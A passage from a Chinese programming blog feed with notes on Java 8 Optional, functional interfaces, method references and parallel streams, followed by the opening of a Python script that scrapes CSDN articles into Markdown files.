class_">Author</span>());<br></code></pre></td></tr></table></figure></li><li><p>orElseThrow</p><p>获取数据，如果数据不为空就能获取到该数据。如果为空则根据你传入的参数来创建异常抛出。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Optional&lt;Author&gt; authorOptional = Optional.ofNullable(getAuthor());<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">Author</span> <span class="hljs-variable">author</span> <span class="hljs-operator">=</span> authorOptional.orElseThrow((Supplier&lt;Throwable&gt;) () -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;author为空&quot;</span>));<br>    System.out.println(author.getName());<br>&#125; <span class="hljs-keyword">catch</span> (Throwable throwable) &#123;<br>    throwable.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="425-过滤"><a class="markdownIt-Anchor" href="#425-过滤"></a> 4.2.5 过滤</h4><p>​我们可以使用filter方法对数据进行过滤。如果原本是有数据的，但是不符合判断，也会变成一个无数据的Optional对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Optional&lt;Author&gt; authorOptional = Optional.ofNullable(getAuthor());<br>authorOptional.filter(author -&gt; author.getAge()&gt;<span class="hljs-number">100</span>).ifPresent(author -&gt; System.out.println(author.getName()));<br><br></code></pre></td></tr></table></figure><h4 id="426-判断"><a class="markdownIt-Anchor" href="#426-判断"></a> 4.2.6 判断</h4><p>​我们可以使用isPresent方法进行是否存在数据的判断。如果为空返回值为false,如果不为空，返回值为true。但是这种方式并不能体现Optional的好处，<strong>更推荐使用ifPresent方法</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Optional&lt;Author&gt; authorOptional = Optional.ofNullable(getAuthor());<br><br><span class="hljs-keyword">if</span> (authorOptional.isPresent()) &#123;<br>    System.out.println(authorOptional.get().getName());<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="427-数据转换"><a class="markdownIt-Anchor" href="#427-数据转换"></a> 4.2.7 数据转换</h4><p>​Optional还提供了map可以让我们的对数据进行转换，并且转换得到的数据也还是被Optional包装好的，保证了我们的使用安全。</p><p>例如我们想获取作家的书籍集合。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testMap</span><span class="hljs-params">()</span> &#123;<br>    Optional&lt;Author&gt; authorOptional = getAuthorOptional();<br>    Optional&lt;List&lt;Book&gt;&gt; optionalBooks = authorOptional.map(author -&gt; author.getBooks());<br>    optionalBooks.ifPresent(books -&gt; System.out.println(books));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-函数式接口"><a class="markdownIt-Anchor" href="#5-函数式接口"></a> 5. 函数式接口</h2><h3 id="51-概述"><a class="markdownIt-Anchor" href="#51-概述"></a> 5.1 概述</h3><p>​<strong>只有一个抽象方法</strong>的接口我们称之为函数接口。</p><p>​JDK的函数式接口都加上了**@FunctionalInterface** 注解进行标识。但是无论是否加上该注解只要接口中只有一个抽象方法，都是函数式接口。</p><h3 id="52-常见函数式接口"><a class="markdownIt-Anchor" href="#52-常见函数式接口"></a> 5.2 常见函数式接口</h3><ul><li><p>​Consumer 消费接口</p><p>根据其中抽象方法的参数列表和返回值类型知道，我们可以在方法中对传入的参数进行消费。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20211028145622163-16354041894551.png" alt="image-20211028145622163" /></p></li><li><p>​Function 计算转换接口</p><p>根据其中抽象方法的参数列表和返回值类型知道，我们可以在方法中对传入的参数计算或转换，把结果返回</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20211028145707862-16354042291112.png" alt="image-20211028145707862" /></p></li><li><p>​Predicate 判断接口</p><p>根据其中抽象方法的参数列表和返回值类型知道，我们可以在方法中对传入的参数条件判断，返回判断结果</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20211028145818743-16354043004393.png" alt="image-20211028145818743" /></p></li><li><p>​Supplier 生产型接口</p><p>根据其中抽象方法的参数列表和返回值类型知道，我们可以在方法中创建对象，把创建好的对象返回</p></li></ul><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20211028145843368-16354043246954.png" alt="image-20211028145843368" /></p><h3 id="53-常用的默认方法"><a class="markdownIt-Anchor" href="#53-常用的默认方法"></a> 5.3 常用的默认方法</h3><ul><li><p>and</p><p>我们在使用Predicate接口时候可能需要进行判断条件的拼接。而and方法相当于是使用&amp;&amp;来拼接两个判断条件</p><p>例如：</p><p>打印作家中年龄大于17并且姓名的长度大于1的作家。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br>Stream&lt;Author&gt; authorStream = authors.stream();<br>authorStream.filter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Predicate</span>&lt;Author&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">test</span><span class="hljs-params">(Author author)</span> &#123;<br>        <span class="hljs-keyword">return</span> author.getAge()&gt;<span class="hljs-number">17</span>;<br>    &#125;<br>&#125;.and(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Predicate</span>&lt;Author&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">test</span><span class="hljs-params">(Author author)</span> &#123;<br>        <span class="hljs-keyword">return</span> author.getName().length()&gt;<span class="hljs-number">1</span>;<br>    &#125;<br>&#125;)).forEach(author -&gt; System.out.println(author));<br></code></pre></td></tr></table></figure></li><li><p>or</p><p>我们在使用Predicate接口时候可能需要进行判断条件的拼接。而or方法相当于是使用||来拼接两个判断条件。</p><p>例如：</p><p>打印作家中年龄大于17或者姓名的长度小于2的作家。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        打印作家中年龄大于17或者姓名的长度小于2的作家。</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        authors.stream()<br>                .filter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Predicate</span>&lt;Author&gt;() &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">test</span><span class="hljs-params">(Author author)</span> &#123;<br>                        <span class="hljs-keyword">return</span> author.getAge()&gt;<span class="hljs-number">17</span>;<br>                    &#125;<br>                &#125;.or(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Predicate</span>&lt;Author&gt;() &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">test</span><span class="hljs-params">(Author author)</span> &#123;<br>                        <span class="hljs-keyword">return</span> author.getName().length()&lt;<span class="hljs-number">2</span>;<br>                    &#125;<br>                &#125;)).forEach(author -&gt; System.out.println(author.getName()));<br></code></pre></td></tr></table></figure></li><li><p>negate</p><p>Predicate接口中的方法。negate方法相当于是在判断添加前面加了个! 表示取反</p><p>例如：</p><p>打印作家中年龄不大于17的作家。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        打印作家中年龄不大于17的作家。</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        authors.stream()<br>                .filter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Predicate</span>&lt;Author&gt;() &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">test</span><span class="hljs-params">(Author author)</span> &#123;<br>                        <span class="hljs-keyword">return</span> author.getAge()&gt;<span class="hljs-number">17</span>;<br>                    &#125;<br>                &#125;.negate()).forEach(author -&gt; System.out.println(author.getAge()));<br></code></pre></td></tr></table></figure></li></ul><h2 id="6-方法引用"><a class="markdownIt-Anchor" href="#6-方法引用"></a> 6. 方法引用</h2><p>​我们在使用lambda时，如果方法体中只有一个方法的调用的话（包括构造方法）,我们可以用方法引用进一步简化代码。</p><h3 id="61-推荐用法"><a class="markdownIt-Anchor" href="#61-推荐用法"></a> 6.1 推荐用法</h3><p>​我们在使用lambda时不需要考虑什么时候用方法引用，用哪种方法引用，方法引用的格式是什么。我们只需要在写完lambda方法发现方法体只有一行代码，并且是方法的调用时使用快捷键尝试是否能够转换成方法引用即可。</p><p>​当我们方法引用使用的多了慢慢的也可以直接写出方法引用。</p><h3 id="62-基本格式"><a class="markdownIt-Anchor" href="#62-基本格式"></a> 6.2 基本格式</h3><p>​类名或者对象名::方法名</p><h3 id="63-语法详解了解"><a class="markdownIt-Anchor" href="#63-语法详解了解"></a> 6.3 语法详解(了解)</h3><h4 id="631-引用类的静态方法"><a class="markdownIt-Anchor" href="#631-引用类的静态方法"></a> 6.3.1 引用类的静态方法</h4><p>​其实就是引用类的静态方法</p><h5 id="格式"><a class="markdownIt-Anchor" href="#格式"></a> 格式</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">类名::方法名<br></code></pre></td></tr></table></figure><h5 id="使用前提"><a class="markdownIt-Anchor" href="#使用前提"></a> 使用前提</h5><p>​如果我们在重写方法的时候，方法体中<strong>只有一行代码</strong>，并且这行代码是<strong>调用了某个类的静态方法</strong>，并且我们把要重写的<strong>抽象方法中所有的参数都按照顺序传入了这个静态方法中</strong>，这个时候我们就可以引用类的静态方法。</p><p>​</p><p>例如：</p><p>如下代码就可以用方法引用进行简化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br><br>Stream&lt;Author&gt; authorStream = authors.stream();<br><br>authorStream.map(author -&gt; author.getAge())<br>        .map(age-&gt;String.valueOf(age));<br></code></pre></td></tr></table></figure><p>注意，如果我们所重写的方法是没有参数的，调用的方法也是没有参数的也相当于符合以上规则。</p><p>优化后如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br><br>Stream&lt;Author&gt; authorStream = authors.stream();<br><br>authorStream.map(author -&gt; author.getAge())<br>        .map(String::valueOf);<br></code></pre></td></tr></table></figure><h4 id="632-引用对象的实例方法"><a class="markdownIt-Anchor" href="#632-引用对象的实例方法"></a> 6.3.2 引用对象的实例方法</h4><h5 id="格式-2"><a class="markdownIt-Anchor" href="#格式-2"></a> 格式</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">对象名::方法名<br></code></pre></td></tr></table></figure><h5 id="使用前提-2"><a class="markdownIt-Anchor" href="#使用前提-2"></a> 使用前提</h5><p>​如果我们在重写方法的时候，方法体中<strong>只有一行代码</strong>，并且这行代码是<strong>调用了某个对象的成员方法</strong>，并且我们把要重写的<strong>抽象方法中所有的参数都按照顺序传入了这个成员方法中</strong>，这个时候我们就可以引用对象的实例方法</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br><br>Stream&lt;Author&gt; authorStream = authors.stream();<br><span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>authorStream.map(author -&gt; author.getName())<br>        .forEach(name-&gt;sb.append(name));<br></code></pre></td></tr></table></figure><p>优化后：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br><br>Stream&lt;Author&gt; authorStream = authors.stream();<br><span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>authorStream.map(author -&gt; author.getName())<br>        .forEach(sb::append);<br></code></pre></td></tr></table></figure><h4 id="634-引用类的实例方法"><a class="markdownIt-Anchor" href="#634-引用类的实例方法"></a> 6.3.4 引用类的实例方法</h4><h5 id="格式-3"><a class="markdownIt-Anchor" href="#格式-3"></a> 格式</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">类名::方法名<br></code></pre></td></tr></table></figure><h5 id="使用前提-3"><a class="markdownIt-Anchor" href="#使用前提-3"></a> 使用前提</h5><p>​如果我们在重写方法的时候，方法体中<strong>只有一行代码</strong>，并且这行代码是<strong>调用了第一个参数的成员方法</strong>，并且我们把要<strong>重写的抽象方法中剩余的所有的参数都按照顺序传入了这个成员方法中</strong>，这个时候我们就可以引用类的实例方法。</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">   <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UseString</span>&#123;<br>       String <span class="hljs-title function_">use</span><span class="hljs-params">(String str,<span class="hljs-type">int</span> start,<span class="hljs-type">int</span> length)</span>;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">subAuthorName</span><span class="hljs-params">(String str, UseString useString)</span>&#123;<br>       <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>       <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>       <span class="hljs-keyword">return</span> useString.use(str,start,length);<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>       subAuthorName(<span class="hljs-string">&quot;三更草堂&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">UseString</span>() &#123;<br>           <span class="hljs-meta">@Override</span><br>           <span class="hljs-keyword">public</span> String <span class="hljs-title function_">use</span><span class="hljs-params">(String str, <span class="hljs-type">int</span> start, <span class="hljs-type">int</span> length)</span> &#123;<br>               <span class="hljs-keyword">return</span> str.substring(start,length);<br>           &#125;<br>       &#125;);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>优化后如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>    subAuthorName(<span class="hljs-string">&quot;三更草堂&quot;</span>, String::substring);<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="635-构造器引用"><a class="markdownIt-Anchor" href="#635-构造器引用"></a> 6.3.5 构造器引用</h4><p>​如果方法体中的一行代码是构造器的话就可以使用构造器引用。</p><h5 id="格式-4"><a class="markdownIt-Anchor" href="#格式-4"></a> 格式</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">类名::<span class="hljs-keyword">new</span><br></code></pre></td></tr></table></figure><h5 id="使用前提-4"><a class="markdownIt-Anchor" href="#使用前提-4"></a> 使用前提</h5><p>​如果我们在重写方法的时候，方法体中<strong>只有一行代码</strong>，并且这行代码是<strong>调用了某个类的构造方法</strong>，并且我们把<strong>要重写的抽象方法中的所有的参数都按照顺序传入了这个构造方法中</strong>，这个时候我们就可以引用构造器。</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br>authors.stream()<br>        .map(author -&gt; author.getName())<br>        .map(name-&gt;<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(name))<br>        .map(sb-&gt;sb.append(<span class="hljs-string">&quot;-三更&quot;</span>).toString())<br>        .forEach(str-&gt; System.out.println(str));<br></code></pre></td></tr></table></figure><p>优化后：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br>authors.stream()<br>        .map(author -&gt; author.getName())<br>        .map(StringBuilder::<span class="hljs-keyword">new</span>)<br>        .map(sb-&gt;sb.append(<span class="hljs-string">&quot;-三更&quot;</span>).toString())<br>        .forEach(str-&gt; System.out.println(str));<br></code></pre></td></tr></table></figure><h2 id="7-高级用法"><a class="markdownIt-Anchor" href="#7-高级用法"></a> 7. 高级用法</h2><h3 id="基本数据类型优化"><a class="markdownIt-Anchor" href="#基本数据类型优化"></a> 基本数据类型优化</h3><p>​我们之前用到的很多Stream的方法由于都使用了泛型。所以涉及到的参数和返回值都是引用数据类型。</p><p>​即使我们操作的是整数小数，但是实际用的都是他们的包装类。JDK5中引入的自动装箱和自动拆箱让我们在使用对应的包装类时就好像使用基本数据类型一样方便。但是你一定要知道装箱和拆箱肯定是要消耗时间的。虽然这个时间消耗很下。但是在大量的数据不断的重复装箱拆箱的时候，你就不能无视这个时间损耗了。</p><p>​所以为了让我们能够对这部分的时间消耗进行优化。Stream还提供了很多专门针对基本数据类型的方法。</p><p>​例如：mapToInt,mapToLong,mapToDouble,flatMapToInt,flatMapToDouble等。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test27</span><span class="hljs-params">()</span> &#123;<br><br>    List&lt;Author&gt; authors = getAuthors();<br>    authors.stream()<br>            .map(author -&gt; author.getAge())<br>            .map(age -&gt; age + <span class="hljs-number">10</span>)<br>            .filter(age-&gt;age&gt;<span class="hljs-number">18</span>)<br>            .map(age-&gt;age+<span class="hljs-number">2</span>)<br>            .forEach(System.out::println);<br><br>    authors.stream()<br>            .mapToInt(author -&gt; author.getAge())<br>            .map(age -&gt; age + <span class="hljs-number">10</span>)<br>            .filter(age-&gt;age&gt;<span class="hljs-number">18</span>)<br>            .map(age-&gt;age+<span class="hljs-number">2</span>)<br>            .forEach(System.out::println);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="并行流"><a class="markdownIt-Anchor" href="#并行流"></a> 并行流</h3><p>​当流中有大量元素时，我们可以使用并行流去提高操作的效率。其实并行流就是把任务分配给多个线程去完全。如果我们自己去用代码实现的话其实会非常的复杂，并且要求你对并发编程有足够的理解和认识。而如果我们使用Stream的话，我们只需要修改一个方法的调用就可以使用并行流来帮我们实现，从而提高效率。</p><p>​parallel方法可以把串行流转换成并行流。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test28</span><span class="hljs-params">()</span> &#123;<br>    Stream&lt;Integer&gt; stream = Stream.of(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>);<br>    <span class="hljs-type">Integer</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> stream.parallel()<br>            .peek(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Consumer</span>&lt;Integer&gt;() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(Integer num)</span> &#123;<br>                    System.out.println(num+Thread.currentThread().getName());<br>                &#125;<br>            &#125;)<br>            .filter(num -&gt; num &gt; <span class="hljs-number">5</span>)<br>            .reduce((result, ele) -&gt; result + ele)<br>            .get();<br>    System.out.println(sum);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>peek()</code>：协助调试</p><p>​正因为 peek() 不是一个最终操作，不会影响“哪些元素会流过”，所以十分适合在调试的时候，用来打印出流经管道的元素。</p><p>也可以通过parallelStream直接获取并行流对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br>authors.parallelStream()<br>        .map(author -&gt; author.getAge())<br>        .map(age -&gt; age + <span class="hljs-number">10</span>)<br>        .filter(age-&gt;age&gt;<span class="hljs-number">18</span>)<br>        .map(age-&gt;age+<span class="hljs-number">2</span>)<br>        .forEach(System.out::println);<br></code></pre></td></tr></table></figure><p>上面笔记来自三更草堂，加了一点我自己的笔记。</p><p>转载 <a href="https://www.bilibili.com/video/BV1Gh41187uR/?spm_id_from=333.999.0.0&amp;vd_source=a432f7b466d0eab98b92ac7132f5ca5c">三更草堂的不会Lambda表达式、函数式编程？你确定能看懂公司代码？-java8函数式编程学习笔记</a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>基础</tag>
      
      <tag>Stream</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>爬取csdn文章保存成MD</title>
    <link href="/2022/12/15/%E7%88%AC%E5%8F%96csdn%E6%96%87%E7%AB%A0%E4%BF%9D%E5%AD%98%E6%88%90MD/"/>
    <url>/2022/12/15/%E7%88%AC%E5%8F%96csdn%E6%96%87%E7%AB%A0%E4%BF%9D%E5%AD%98%E6%88%90MD/</url>
    
    <content type="html"><![CDATA[<h1 id="爬取csdn文章保存成md"><a class="markdownIt-Anchor" href="#爬取csdn文章保存成md"></a> 爬取csdn文章保存成MD</h1><h2 id="全部代码"><a class="markdownIt-Anchor" href="#全部代码"></a> 全部代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> html2text<br><span class="hljs-keyword">import</span> html2markdown<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27; Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span>,<br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getTitle</span>(<span class="hljs-params">tree</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    得到文章的标题</span><br><span class="hljs-string">    :param tree:</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    titles = tree.xpath(<span class="hljs-string">&#x27;//h1[@id=&quot;articleContentId&quot;]//text()&#x27;</span>)<br>    <span class="hljs-keyword">return</span> titles[<span class="hljs-number">0</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title 